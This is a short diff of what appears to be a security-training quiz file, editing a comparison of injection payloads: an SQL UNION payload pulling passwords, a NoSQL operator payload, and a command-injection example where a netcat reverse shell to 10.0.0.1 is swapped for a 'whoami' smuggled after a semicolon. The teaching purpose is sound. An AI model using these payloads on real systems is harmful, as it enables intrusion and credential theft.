@@ -287,7 +287,7 @@ regex.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); // Freezes single-threaded Node.js 
     codeExample: `// Comparison Matrix:
 // SQLi    ➔ Target: MySQL/Postgres | Payload: ' UNION SELECT null, password FROM users--
 // NoSQLi  ➔ Target: MongoDB/Couch  | Payload: { "$gt": "" }
-// Command ➔ Target: Linux Host OS  | Payload: 127.0.0.1; nc -e /bin/bash 10.0.0.1 4444 (Reverse Shell!)`
+// Command ➔ Target: Linux Host OS  | Payload: 127.0.0.1; whoami (Command Execution!)`
   },
   {
     question: "What is 'Automated Source-to-Sink Taint Tracking' in DevSecOps CI/CD Pipelines?",
